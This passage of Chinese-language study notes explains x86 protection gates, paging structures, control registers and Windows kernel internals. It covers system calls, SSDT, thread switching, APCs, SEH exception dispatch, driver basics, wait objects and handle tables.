(N为中断门索引号)</code></p></li><li><p>执行步骤：</p><ol><li>在没有权限切换时，会向堆栈顺次压入<code>EFLAG</code>、<code>CS</code>和<code>EIP</code>；如果有权限切换，会向堆栈顺次压入<code>SS</code>、<code>ESP</code>、<code>EFLAG</code>、<code>CS</code>和<code>EIP</code></li><li><code>CPU</code> 会索引到 <code>IDT</code> 表。后面的 <code>N</code> 表示查 <code>IDT表</code> 项的下标。对比调用门，中断门没有了 <code>RPL</code>，故 <code>CPU</code> 只会校验 <code>CPL</code></li><li>在中断门中,不能通过 <code>RETF</code> 返回，而应该通过 <code>IRET</code>/<code>IRETD</code> 指令返回</li></ol><ul><li>这里也要注意真正执行地址也是 <code>Base</code> + <code>偏移地址</code>, 所以这里也会索引到 <code>GDT</code>的一个一致代码段</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023237.png" alt="image-20230912200532795" /></p><ul><li>补充：<ul><li>图中的 <code>D</code> 为1表示为32位</li></ul></li></ul><h3 id="陷阱们"><a class="markdownIt-Anchor" href="#陷阱们"></a> 陷阱们</h3><ul><li>陷阱门执行流程一模一样。与中断门的区别，中断门执行时，将 <code>IF位</code> 清零,使得可以屏蔽中断(关中断) 但陷阱门不会</li><li>关于中断(这里指可屏蔽中断)<ul><li><code>CLI</code> 禁止中断发生，关中断，使中断标志(IF) = 0</li><li><code>STI</code> 允许中断发生，开中断，使中断标志(IF) = 1</li><li>关闭中断指不允许其他操作引起中断，使处理器被其余程序所调用</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023254.png" alt="image-20230912202407828" /></p><h3 id="任务门"><a class="markdownIt-Anchor" href="#任务门"></a> 任务门</h3><ul><li>任务段(TSS)</li></ul><p>​这里需要首先知道TSS段描述符的概念，它是一个系统段描述符，TSS主要作用就是换掉一堆的寄存器，这里也是权限切换时 <code>ESP</code> 与 <code>SS</code> 的来源</p><ul><li><p>描述</p><ul><li>任务门存在于<strong>IDT表</strong></li><li>任务门中包含<strong>TSS段选择子</strong></li><li>可以通过访问任务门达到<strong>切换TSS</strong>的目的</li></ul></li><li><p>执行流程</p><ol><li><p>通过<code>INT N</code> (N为IDT表索引号)的指令进行触发任务门</p></li><li><p>查<code>IDT</code>表，找到对应的任务门描述符</p></li><li><p>通过任务门描述符，则根据任务门描述符中<code>TSS段选择子</code>查找<code>GDT表</code>，找到<code>TSS段描述符</code></p></li><li><p>将TSS段描述符中的值加载到<code>TR</code>寄存器</p></li><li><p>TR段寄存器通过Base和Limit找到<code>TSS</code></p></li><li><p>使用TSS中的值修改寄存器</p></li><li><p><code>IRETD</code>返回</p></li></ol></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023261.png" alt="image-20230913092034031" /></p><h2 id="关于页"><a class="markdownIt-Anchor" href="#关于页"></a> 关于页</h2><h3 id="地址"><a class="markdownIt-Anchor" href="#地址"></a> 地址</h3><ul><li>地址分为有效地址，线性地址，物理地址<ul><li><code>0x12345678</code> 有效地址</li><li><code>ds.Base + 0x12345678</code> 线性地址</li></ul></li></ul><h3 id="cr3"><a class="markdownIt-Anchor" href="#cr3"></a> Cr3</h3><ul><li>控制寄存器<ul><li>每个进程都有一个Cr3(准确的说是都有一个Cr3的值，Cr3本身是个寄存器，一个核，只有一套寄存器)</li><li>Cr3指向一个物理页，一共4096字节</li></ul></li><li>通过Cr3来找物理地址<ul><li>找第一层和第二层的时候要将<strong>索引 * 4</strong> (每个地址占4个字节)----三次<code>!dd</code>找到位置</li><li>每找到一层都要将地址后三位(3个字节) <strong>属性位</strong> 清零再继续找下一层</li></ul></li></ul><p>​在所有的寄存器中，只有Cr3存储的是<strong>物理地址</strong>，其它寄存器存的都是<strong>线性地址</strong>, Cr3所存储的物理地址指向了一个<strong>页目录表(PDT)</strong>, 在Windows中，一个页的大小通常为<strong>4KB</strong>，即一个页可以存储<strong>1024个</strong>页目录表项(PDE)</p><h3 id="10-10-12"><a class="markdownIt-Anchor" href="#10-10-12"></a> 10-10-12</h3><ol><li>一个物理页的大小为<strong>4096字节</strong>，即<strong>2的12次方</strong>，若要遍历整个物理页，则需要12个比特位</li><li>一个页表有1024个页表项，1024等于2的十次方，即需要10个比特位</li><li>页目录表项同理，也需要10个比特位</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023346.png" alt="image-20230913092144120" /></p><h3 id="pdt与ptt"><a class="markdownIt-Anchor" href="#pdt与ptt"></a> PDT与PTT</h3><h4 id="描述"><a class="markdownIt-Anchor" href="#描述"></a> 描述</h4><p>​<strong>页目录表(PDT)</strong> 的每一项元素称为 <strong>页目录表项(PDE)</strong>, 每个页目录表项指向一个 页表(PTT), 每个页表的大小为 <strong>4KB</strong>，即一个页表可以存储 <strong>1024个</strong> 页表项(PTE) ----4096(4KB)/4(每个页表项32位)</p><p>​页表(PTT) 的每一个元素称为 页表项(PTE), 页表项(PTE) 所指向的才是真正的物理页</p><ul><li>特征<ul><li>PTE可以指向一个物理页，也可以不指向物理页</li><li>多个PTE可以指向一个物理页</li><li>一个PTE只能指向一个物理页</li></ul></li></ul><h4 id="物理页属性"><a class="markdownIt-Anchor" href="#物理页属性"></a> 物理页属性</h4><p>​物理页属性 = <code>PDE属性</code> &amp; <code>PTE属性</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023317.png" alt="image-20230913094214169" /></p><ul><li><p>P 位</p><ul><li>表示<code>PDE</code>或者<code>PTE</code>是否有效，如果有效为<code>1</code>，反之为<code>0</code></li></ul></li><li><p>R/W 位</p><ul><li>如果<code>R/W = 0</code>，表示是只读的，反之为可读可写</li></ul></li><li><p>U/S 位</p><ul><li>如果<code>U/S = 0</code>，则为特权用户(super user)，即非3环权限。反之，则为普通用户，即为3环权限</li></ul></li><li><p>PS位</p><ul><li>这个位只对<code>PDE</code>有意义。如果<code>PS == 1</code>，则<code>PDE</code>直接指向物理页，不再指向<code>PTE</code>，低22位是页内偏移。它的大小为<code>4MB</code>，俗称“大页”</li></ul></li><li><p><code>PWT</code>全称为<code>Page Write Through</code>，<code>PWT = 1</code>时，写<code>Cache</code>的时候也要将数据写入内存中。</p></li><li><p><code>PCD</code>全称为<code>Page Cache Disable</code>，<code>PCD = 1</code>时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在<code>TLB</code>中了，可能不需要再缓存了。</p></li></ul><h4 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h4><ol><li>页表被映射到了从<code>0xC0000000~0xC03FFFFF</code>的<strong>4M</strong>地址空间</li><li>在这1024个表中有一张特殊的表：<strong>页目录表</strong></li><li>页目录被映射到了0xC0300000开始处的<strong>4K</strong>地址空间</li></ol><ul><li><p>访问页目录表的公式：<code>0xC0300000 + PDI * 4</code></p></li><li><p>这里线性地址 <code>0xc0300000</code> 解析出来指向 <code>PDT</code> 表的第一项，所以我们使用 <code>0xc0300000 + k*4</code> 就可以获得第 <code>k+1</code> 项 <code>PDE</code> 的地址</p></li><li><p>访问页表的公式：<code>0xC0000000 + PDI * 4096 + PTI * 4</code></p></li><li><p>而线性地址 <code>0xc0000000</code> 解析出来指向第一个 <code>PDE</code> 指向的 <code>PTT</code> 表的第一项，所以我们使用<code>0xc0000000 + i*0x1000 + j*4</code> 就可以得到第 <code>i+1</code> 项 <code>PDE</code> 指向的 <code>PTT</code> 表中的第 <code>j+1</code>项 <code>PTE</code> 的地址</p></li></ul><h4 id="关注"><a class="markdownIt-Anchor" href="#关注"></a> 关注</h4><ul><li>修改一个高2G线性地址的<code>PDE</code>/<code>PTE</code>属性，实现<code>Ring3</code>可读<ul><li>这里还要更改别的地方的选项<a href="https://lzyddf.blog.csdn.net/article/details/102627239">博客</a>, 需要看情况修改PDE与PTE的 <code>U/S</code> 位为1，赋予3环的读取权限, 否则不能读取成功</li><li>对于羽夏的教程，这里大页更改也是更改 <code>U/S</code> 位，而不是它写的直接更改一个怪异的物理页</li></ul></li></ul><h3 id="2-9-9-12pae分页"><a class="markdownIt-Anchor" href="#2-9-9-12pae分页"></a> 2-9-9-12(PAE分页)</h3><ul><li><p>这里的 <code>windbg</code> 记得使用 <code>!dq</code> 来查看地址</p></li><li><p>每个<code>PDE</code>和<code>PTE</code>被扩展为8个字节，物理地址描述的位数扩展为<code>24位</code>，故可以描述更多的物理页，但个数减半，变成了512个</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023341.png" alt="image-20230915101737336" /></p><h3 id="pdpttpdtptt"><a class="markdownIt-Anchor" href="#pdpttpdtptt"></a> PDPTT,PDT,PTT</h3><h4 id="pdpte"><a class="markdownIt-Anchor" href="#pdpte"></a> PDPTE</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023713.png" alt="image-20230915105429306" /></p><ul><li><code>PDPTE</code> 的12-35位存储了页目录表基址的高24位，低12位(在图上显示)补零, 共36位，即页目录基址。</li></ul><h4 id="pde"><a class="markdownIt-Anchor" href="#pde"></a> PDE</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023783.png" alt="image-20230915105902929" /></p><ul><li><p>第7位 <code>PS</code> = 1 时，PDE直接指向大页，21-35(15位)指向大页的物理地址，这样36位的物理地址中低21位为0，即页的大小为2MB，且都是2MB对齐；当 <code>PS</code> = 0 时，21-35是页表基址，低12位补0，共36位。</p></li><li><p>解释一下G位，G=1表示这是全局页，是多个进程共享的，这种页是通过 CreateFileMapping 申请的, G=1，即为全局页，进程(CR3)切换时，TLB中的记录不会被刷新; 与之对应的，G=0就是进程独享的物理页，这种页是通过 VirtualAlloc 分配的。</p></li></ul><h4 id="pte"><a class="markdownIt-Anchor" href="#pte"></a> PTE</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023762.png" alt="image-20230915111153273" /></p><ul><li>PTE中12-35是物理页基址, 24位, 低12位补0。</li><li>物理页基址 + 12位的页内偏移指向具体数据</li></ul><h4 id="xd标志位"><a class="markdownIt-Anchor" href="#xd标志位"></a> XD标志位</h4><ul><li>AMD中称为NX，即 No Excetion</li><li>PDE/PTE结构</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023858.png" alt="image-20230915111442369" /></p><ul><li>段的属性有可读、可写和可执行; 页的属性有可读、可写</li><li>当RET执行返回的时候，如果把堆栈里面的数据指向一段提前准备好的数据(把数据当作代码来执行，漏洞都是依赖这点，比如SQL注入也是)，那么就会产生任意代码执行的后果。 所以，Intel就在这方面做了硬件保护，设置了一个不可执行位 – XD/NX位。</li><li>当XD=1时，软件产生了溢出也没有关系，即使EIP蹦到了危险的“数据区”，也是不可以执行的在PAE分页模式下，PDE与PTE的最高位为XD/NX位.</li></ul><h3 id="plb"><a class="markdownIt-Anchor" href="#plb"></a> PLB</h3><table><thead><tr><th>LA(线性地址)</th><th>PA(物理地址)</th><th>ATTR(属性)</th><th>LRU(统计)</th></tr></thead><tbody><tr><td>0x81010111</td><td>……</td><td>……</td><td>1</td></tr></tbody></table><p>对于<code>TLB</code>，给出如下说明：<br />  1. ATTR(属性)：如果是<code>2-9-9-12</code>分页，属性是<code>PDPE</code>、<code>PDE</code>、<code>PTE</code>三个属性共同决定的。如果是<code>10-10-12</code>分页就是<code>PDE</code>和<code>PTE</code>共同决定。<br />  2. 不同的<code>CPU</code>这个表的大小不一样。<br />  3. 只要<code>Cr3</code>变了，<code>TLB</code>立马刷新，一核一套<code>TLB</code></p><h3 id="控制寄存器"><a class="markdownIt-Anchor" href="#控制寄存器"></a> 控制寄存器</h3><p>​Cr0、Cr1、Cr2、Cr3，<code>Cr1</code>被保留了，<code>Cr3</code>用于页目录表基址</p><h4 id="cr0"><a class="markdownIt-Anchor" href="#cr0"></a> Cr0</h4><p>​<code>Cr0</code>是一个十分重要的寄存器，可以说它是总开关的集合体</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023094.png" alt="image-20230917155626976" /></p><h4 id="cr2"><a class="markdownIt-Anchor" href="#cr2"></a> Cr2</h4><p>​当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023097.png" alt="image-20230917155703341" /></p><h4 id="cr4"><a class="markdownIt-Anchor" href="#cr4"></a> Cr4</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023236.png" alt="image-20230917155724613" /></p><ul><li><code>PAE</code>用于确认是哪个分页，<code>PAE = 1</code>，是<code>2-9-9-12</code>分页，<code>PAE = 0</code>是<code>10-10-12</code>分页</li><li><code>PSE</code>是大页是否开启的总开关，如果置0，就算<code>PDE</code>中设置了大页你也得是普通的页</li></ul><h1 id="系统调用"><a class="markdownIt-Anchor" href="#系统调用"></a> 系统调用</h1><h2 id="前瞻"><a class="markdownIt-Anchor" href="#前瞻"></a> 前瞻</h2><p>​几个重要的dll</p><ul><li><code>Kernel32.dll</code>: 最核心的功能模块，比如管理内存、进程和线程相关的函数等</li><li><code>User32.dll</code>: 是Windows用户界面相关应用程序接口,如创建窗口和发送消息等</li><li><code>GDI32.dll</code>: 全称是Graphical Device Interface(图形设备接口)，包含用于画图和显示文本的函数。比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li><li><code>Ntdll.dll</code>: 大多数API都会通过这个DLL进入内核(0环)</li></ul><h2 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h2><h3 id="3环进0环"><a class="markdownIt-Anchor" href="#3环进0环"></a> 3环进0环</h3><ul><li>API通过<code>中断门</code>进0环<ul><li>固定中断号为0x2E</li><li>CS/EIP由门描述符提供，ESP/SS由TSS提供</li><li>进入0环后执行的内核函数：<code>NT!KiSystemService</code></li></ul></li><li>API通过<code>sysenter</code>指令进0环<ul><li>CS/ESP/EIP 由MSR寄存器提供(SS是算出来的)</li><li>进入0环后执行的内核函数：<code>NT!KiFastCallEntry</code></li></ul></li></ul><h3 id="保存现场"><a class="markdownIt-Anchor" href="#保存现场"></a> 保存现场</h3><h4 id="tarp-frame"><a class="markdownIt-Anchor" href="#tarp-frame"></a> Tarp Frame</h4><ul><li>无论是通过中断门进入0环，还是通过快速调用进入0环，进入0环前(3环)的所有寄存器都会存到这个结构体中</li><li>这个结构体本身处于0环，由windows操作系统进行维护</li><li>当程序通过中断门从3环进入0环时，ESP指向 <code>TrapFrame+0x64 </code> 的位置<ul><li>在<strong>KiSystemService</strong>函数开始执行时，3环的<code>SS</code>、<code>ESP</code>、<code>EFLAGS</code>、<code>CS</code>、<code>EIP</code>就已经被 CPU 存储到 Trap Frame 结构体</li></ul></li><li>当程序通过快速调用从3环进入0环时，ESP指向 <code>TrapFrame+0x78</code> 的位置<ul><li>这里需要该函数进行压栈处理</li></ul></li></ul><h3 id="系统服务表"><a class="markdownIt-Anchor" href="#系统服务表"></a> 系统服务表</h3><ul><li><p>系统服务表：<code>System Service Table</code></p></li><li><p>系统服务表共有<strong>两张</strong>，第一张表后紧接第二张表</p></li><li><p>系统服务表里的函数都是来自<strong>内核文件</strong>导出的函数</p></li><li><p>它并不包含内核文件导出的所有函数，而是<strong>3环最常用的</strong>内核函数</p></li><li><p>系统服务表位于 <code>_KTHREAD +00xE0</code></p></li></ul><h3 id="ssdt"><a class="markdownIt-Anchor" href="#ssdt"></a> SSDT</h3><ul><li><p>全称：<strong>System Services Descriptor Table</strong>(系统服务描述符表)</p></li><li><p>SSDT的<strong>每个成员</strong>叫做<strong>系统服务表</strong></p></li><li><p>SSDT的<strong>第一个成员是导出的</strong>，声明一下即可使用</p></li><li><p>SSDT的<strong>第二个成员是未导出的</strong>，需要通过其它方式查找</p></li><li><p>在Windows中，SSDT的<strong>第三个成员和第四个成员未被使用</strong></p></li></ul><h1 id="进程与线程"><a class="markdownIt-Anchor" href="#进程与线程"></a> 进程与线程</h1><h2 id="前瞻-2"><a class="markdownIt-Anchor" href="#前瞻-2"></a> 前瞻</h2><p>​关注几个结构体</p><ul><li><p>进程</p><ul><li>EPROCESS<ul><li><code>Pcb</code> _KPROCESS</li><li><code>Peb</code> Ptr32 _PEB</li></ul></li></ul></li><li><p>线程</p><ul><li>ETHREAD<ul><li><code>Tcb</code> _KTHREAD</li><li><code>Teb</code> Ptr32 Void</li></ul></li></ul></li><li><p>CPU</p><ul><li>KCPR<ul><li><code>NtTib</code>    _NT_TIB</li><li><code>PrcbData</code> _KPRCB</li></ul></li></ul></li></ul><h2 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h2><h3 id="线程切换"><a class="markdownIt-Anchor" href="#线程切换"></a> 线程切换</h3><ul><li>主动切换<ul><li>Windows中绝大部分API都调用了<strong>SwapContext</strong>这个函数，也就是说，只要调用了该函数，就会导致线程切换</li><li>线程切换时会比较是否属于同一个进程，如果不是，便切换Cr3，Cr3换了，进程也就切换了</li><li><strong>KiSwapThread</strong> -&gt; <strong>KiSwapContext</strong> -&gt; <strong>SwapContext</strong></li></ul></li><li>时钟切换<ul><li>当前线程的CPU时间片到期</li><li><strong>KiDispatchInterrupt</strong> -&gt; <strong>KiQuantumEnd</strong> -&gt; <strong>SwapContext</strong></li><li>存在备用线程(<code>KPCR.PrcbData.NextThread</code>)</li><li><strong>KiDispatchInterrupt</strong> -&gt; <strong>SwapContext</strong></li></ul></li><li>异常处理<ul><li>如果一个线程<strong>不调用API</strong>，并且在代码中<strong>屏蔽中断</strong>(调用CLI指令)，并且<strong>不会出现异常</strong>，那么当前线程将永久占有CPU</li><li>单核CPU占用率100%，2核CPU占用率50%</li><li>Windows<strong>并非</strong>是“抢占式”操作系统，所谓的“抢“”必须是当前线程允许其它线程“抢”，否则是“抢”不到的</li></ul></li></ul><h1 id="apc相关"><a class="markdownIt-Anchor" href="#apc相关"></a> APC相关</h1><h2 id="前瞻-3"><a class="markdownIt-Anchor" href="#前瞻-3"></a> 前瞻</h2><ol><li>线程是不能被“<strong>杀掉</strong>”、“<strong>挂起</strong>”、“<strong>恢复</strong>”的，线程在执行的时候自己占据着CPU，别人不能控制它</li><li>举个极端的例子：如果<strong>不调用API</strong>，<strong>屏蔽中断</strong>，<strong>并保证代码不出现异常</strong>，线程将<strong>永久</strong>占用CPU</li><li>所以说线程如果想“死”，一定是自己执行代码把自己杀死，不存在“他杀”的情况</li></ol><p>​即这里想改变一个线程的行为，可以给他提供一个函数，让它自己去调用：<strong>APC(Asyncroneus Procedure Call，异步过程调用)</strong></p><h2 id="重点-2"><a class="markdownIt-Anchor" href="#重点-2"></a> 重点</h2><h3 id="结构体相关"><a class="markdownIt-Anchor" href="#结构体相关"></a> 结构体相关</h3><ul><li><code>ApcState</code> _KAPC_STATE: 在 KTHREAD 中存在的一个结构体，其中有元素指向 KAPC 结构体</li></ul><h3 id="挂入过程"><a class="markdownIt-Anchor" href="#挂入过程"></a> 挂入过程</h3><ul><li>用户层调用：QueueUserAPC(kernel32.dll)–&gt;NtQueueApcThread(ntosker.exe)–&gt;内核层</li><li>很多内核函数调用：KeInitializeApc(分配空间 初始化KAPC结构体)–&gt;KeInsertQueueApc–&gt;KiInsertQueueApc(将KAPC插入指定APC队列)</li></ul><h3 id="执行过程"><a class="markdownIt-Anchor" href="#执行过程"></a> 执行过程</h3><p>内核APC执行过程，执行点：线程切换</p><ol><li><code>SwapContext</code> 判断是否有内核APC</li><li><code>KiSwapThread</code></li><li><code>KiDeliverApc</code> 执行内核APC函数</li></ol><p>用户APC执行过程</p><ul><li>执行用户APC时的堆栈操作处理用户APC要比内核APC复杂的多，因为，用户APC函数要在用户空间执行的，这里涉及到大量换栈的操作：</li></ul><ol><li>当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等(<code>_Trap_Frame</code>)，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。</li><li>但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：内核–&gt;用户空间–&gt;再回到内核空间</li></ol><h3 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h3><ol><li>内核APC在线程切换时执行，不需要换栈，比较简单，一个循环执行完毕</li><li>用户APC在系统调用、中断或异常返回3环前会进行判断，如果有要执行的用户APC，再执行</li><li>用户APC执行前会先执行内核APC</li></ol><h1 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h1><h2 id="x86"><a class="markdownIt-Anchor" href="#x86"></a> x86</h2><p><a href="http://betacat.github.io/2011/10/19/SEH-x86/">资料</a></p><ul><li>CPU异常与模拟异常----3环</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023222.png" alt="image-20231001144040446" /></p><ul><li><code>KiDispatchException</code><ul><li>对于0环异常，直接处理</li><li>对于3环异常，修改返回3环的 EIP ，使其指向 KiUsertExceptionDispatcher</li></ul></li><li>3环返回 <code>KiUsertExceptionDispatcher</code> 函数，然后它又调用 RtlDispatchExceptin，这个函数就是查找异常处理程序在哪里</li><li><code>RtlDispatchExceptin</code><ul><li>首先查找 <code>VEH</code></li><li>若是没有，则查找 <code>SEH</code><ul><li>SEH是线程相关的，实际上是一个链表，指向异常处理函数在哪里</li><li>这里展示经过编译器扩展的SEH，这里自己先在栈中构建一个结构体，然后使 <code>prev</code> 指向之前的结构体，然后让 <code>FS:[0]</code> 指向自己；</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023309.png" alt="image-20231001145115314" /></li><li>之后这里 <code>scopetable</code> 的作用就是指向构建 <code>excrpt()</code> 所需要的处理函数。这里也适合 <code>finally</code> 区别在于它的过滤函数为空，然后在后面会执行一个局部展开，来调用位于 <code>scopetable_entry </code>异常处理程序地址的 <code>finally</code> 代码来执行</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023504.png" alt="image-20231001145312210" /></li><li>这里总体流程就是先把自己构建的结构体加入到 SEH 链中，然后使用只在最开始构造的 <code>handler</code> 来对不同的try异常进行分发处理，它根据 <code>trylevel</code> 来寻找不同的 <code>scopetable</code> 来寻找过滤函数和异常处理函数来处理异常，若是没有找到(这里就是过滤函数的返回值，返回0表示不处理这个异常)，则根据 <code>scopetable_entry</code> 结构体中的 <code>previous TryLevel</code> 寻找它的上层处理函数，直到可以处理，或者找到了 <code>-1</code> 表示最高层也不能处理结束，交给编译器处理</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023571.png" alt="image-20231001144903487" /></li></ul></li></ul></li></ul><h2 id="x64"><a class="markdownIt-Anchor" href="#x64"></a> x64</h2><p><a href="https://www.pediy.com/kssd/pediy12/142371.html">资料</a></p><h1 id="驱动开发"><a class="markdownIt-Anchor" href="#驱动开发"></a> 驱动开发</h1><h2 id="内核编程"><a class="markdownIt-Anchor" href="#内核编程"></a> 内核编程</h2><h3 id="内核函数"><a class="markdownIt-Anchor" href="#内核函数"></a> 内核函数</h3><ul><li>在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，要使用WDK自己的帮助文档</li><li>WDK查到的函数就一定在导出表里：<ul><li>文档化函数：函数在导出表里，有文档说明，有头文件</li><li>未文档化函数：导出表里有，没有文档说明，没有头文件，定义<strong>函数指针</strong>去使用(<code>*pFN = GetProcessAddress(&quot;xyz&quot;)</code>)</li><li>未导出函数：不在导出表，无文档说明，没有头文件，可以找到该函数的地址，然后使用<strong>函数指针</strong>去使用(<code>*pFN = 0x89765786</code>)<ul><li>WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。如果要使用未导出的函数，只要定义一个<strong>函数指针</strong>，并且为函数指针提供正确的函数地址就可以使用了。有两种办法都可以获取为导出的函数地址：<ul><li>特征码搜索</li><li>解析内核PDB文件(使用<code>uf 函数名称</code>或<code>u 地址</code>)</li></ul></li></ul></li></ul></li><li>内核函数前缀</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023822.png" alt="f6z1tYC8iWxBM4v" /></p><h2 id="内核空间与内核模块"><a class="markdownIt-Anchor" href="#内核空间与内核模块"></a> 内核空间与内核模块</h2><ul><li>内核空间中，每个进程低2G各不相同，高2G相同，在高2G中做任何事情影响的是所有进程</li><li>在高2G中，并不是只有一个内核模块为所有进程提供服务，而是由许多个模块组成，<strong>每个模块在高2G中都有属于自己独立的内存地址和大小</strong></li><li>若想了解每个内核模块的具体信息，可以通过 <code>_DRIVER_OBJECT</code> 这个结构体，它存储了当前内核模块的具体信息</li><li>任意加载一个驱动，便可通过 <code>_LDR_DATA_TABLE_ENTRY</code> 这个结构体中的双向链表得到所有内核模块的信息</li></ul><h1 id="事件等待"><a class="markdownIt-Anchor" href="#事件等待"></a> 事件等待</h1><h2 id="临界区和自旋锁"><a class="markdownIt-Anchor" href="#临界区和自旋锁"></a> 临界区和自旋锁</h2><ul><li>临界区<ul><li>通过 <code>sleep()</code> 实现</li></ul></li><li>自旋锁<ul><li>通过使当前CPU <code>空转</code> 实现</li></ul></li></ul><h2 id="等待与唤醒"><a class="markdownIt-Anchor" href="#等待与唤醒"></a> 等待与唤醒</h2><ol><li>可等待对象正常情况下都是以 <code>_DISPATCHER_HEADER</code> 结构体开头的，但是有一些特殊的结构体并不是以 <code>_DISPATCHER_HEADER</code> 开头的(如 _FILE_OBJECT)，但是windows又希望把它们也变成所谓的可等待对象，因此在它们内部嵌入一个 <code>_DISPATCHER_HEADER</code> 这样的结构体</li><li>只要是包含 <code>_DISPATCHER_HEADER</code> 结构体的对象，都可以看作是可等待对象，都可以使用 <code>WaitForSingleObject</code> 和 <code>WaitForMultipleObjects</code> 这两个函数进入等待状态</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023751.png" alt="image-20231003151136267" /></p><ul><li>等待中的线程，一定在等待链表中(<code>KiWaitListHead</code>)，同时也一定在这张网上(<code>KTHREAD +5C的位置不为空</code>)</li><li>线程通过调用<code>WaitForSingleObject/WaitForMultipleObjects</code>函数将自己挂到这张网上</li><li>线程什么时候会再次执行取决于其他线程何时调用相关函数，等待对象不同调用的函数也不同</li></ul><h2 id="waitfoesingleobject函数"><a class="markdownIt-Anchor" href="#waitfoesingleobject函数"></a> WaitFoeSingleObject函数</h2><ol><li><p>不同的等待对象，用不同的方法来修改 <code>_DISPATCHER_HEADER-&gt;SignalState</code></p></li><li><p>如果可等待对象是 <code>EVENT</code>，其他线程通常使用 <code>SetEvent</code> 来设置 <code>SignalState = 1</code>，并且，将正在等待该对象的其他线程唤醒，也就是从等待链表<code>(KiWaitListHead</code>)中摘出来，此时线程临时复活</p></li><li><p><code>SetEvent</code> 函数并不会将线程从等待网上摘下来，是否要下来，由当前线程自己来决定。此时线程会在<code>WaitForSingleObject </code>或者 <code>WaitForMultipleObjects </code> 恢复执行(在哪切换就在哪开始执行)，如果符合唤醒条件，就将自己从 <strong>等待网</strong> 上摘下来，此时的线程才是真正的唤醒</p></li><li><p>若使用 <code>SetEvent</code> 这种函数直接将线程从等待网上摘下来，将会非常麻烦，因为可能有非常多的线程在等待一个对象，无法判断该将谁摘下(一个也线程可能等待着多个对象)</p><ul><li>比如：线程A和线程B同时在等待着一个对象，这时如果有线程C调用了SetEvent(将等待对象的信号量置1)，线程A和线程B会被临时唤醒(从KiWaitLkistHead摘下)，并行进入关键循环，假设线程A先运行，线程A会设置等待对象的信号量&lt;=0，然后将自己从等待网上摘下来，此时线程A彻底复活。线程B再去判断等待对象是否有信号量时，已经没有信号量了，这时线程B会将自己重新挂入等待链表中</li></ul></li><li><p>不同对象调用API修改信号个数只在细节上有差异，本质上都是一样的</p><ul><li>这里区分<strong>事件的type属性的不同，信号量，互斥体</strong>。对于这几种不同的对象，其具体的修改策略也是不同的，但是本质上大同小异，都是修改 SignalState</li></ul></li></ol><ul><li>关于强制唤醒<ul><li>在APC专题中，当插入一个用户APC时(<strong>Alertable=1</strong>)，当前线程是可以被唤醒的，但并不是真正的唤醒。因为如果当前的线程在等待网上，执行完用户APC后，线程仍然要进入等待状态</li></ul></li></ul><h1 id="句柄表"><a class="markdownIt-Anchor" href="#句柄表"></a> 句柄表</h1><h2 id="句柄表-2"><a class="markdownIt-Anchor" href="#句柄表-2"></a> 句柄表</h2><h3 id="描述-2"><a class="markdownIt-Anchor" href="#描述-2"></a> 描述</h3><ol><li>当一个进程创建或者打开一个内核对象时，将获得一个句柄，通过这个句柄可以访问对应的内核对象</li><li>句柄表存储在<strong>零环</strong>，一个进程使用了几个句柄，在该进程的句柄表中就会存储几个句柄</li><li>所有的句柄所对应的内核对象，都包含在 <code>_OBJECT_HEADER</code> 中，真正的内核对象保存在 <code>_OBJECT_HEADER +0x018 body</code> 的位置</li></ol><h3 id="注意-2"><a class="markdownIt-Anchor" href="#注意-2"></a> 注意</h3><ol><li><strong>窗口、字体、笔刷</strong>等句柄与本章所学句柄是两码事</li><li>创建句柄不等同于打开句柄，当创建的时候，操作系统会在零环为内核对象分配一个结构体(例如<code>CreateEvent</code>)，如果自己或他人打开了这个内核对象(例如<code>OpenProcess</code>)，那么将不会再次为这个内核对象分配一个结构体，而是返回一个句柄的索引值</li><li>若同一个内核对象被引用了100次，那么在句柄表中就会存储100个内核对象的地址</li><li>句柄的值并非如上图所显示的只占4个字节，而是<strong>占8个字节</strong>，但是句柄表的值仍然按照<strong>4个字节</strong>进行计算</li></ol><p><strong>句柄索引定位对应句柄的计算公式</strong>：<code>handle = index / 4 * 8</code></p><h2 id="全局句柄表"><a class="markdownIt-Anchor" 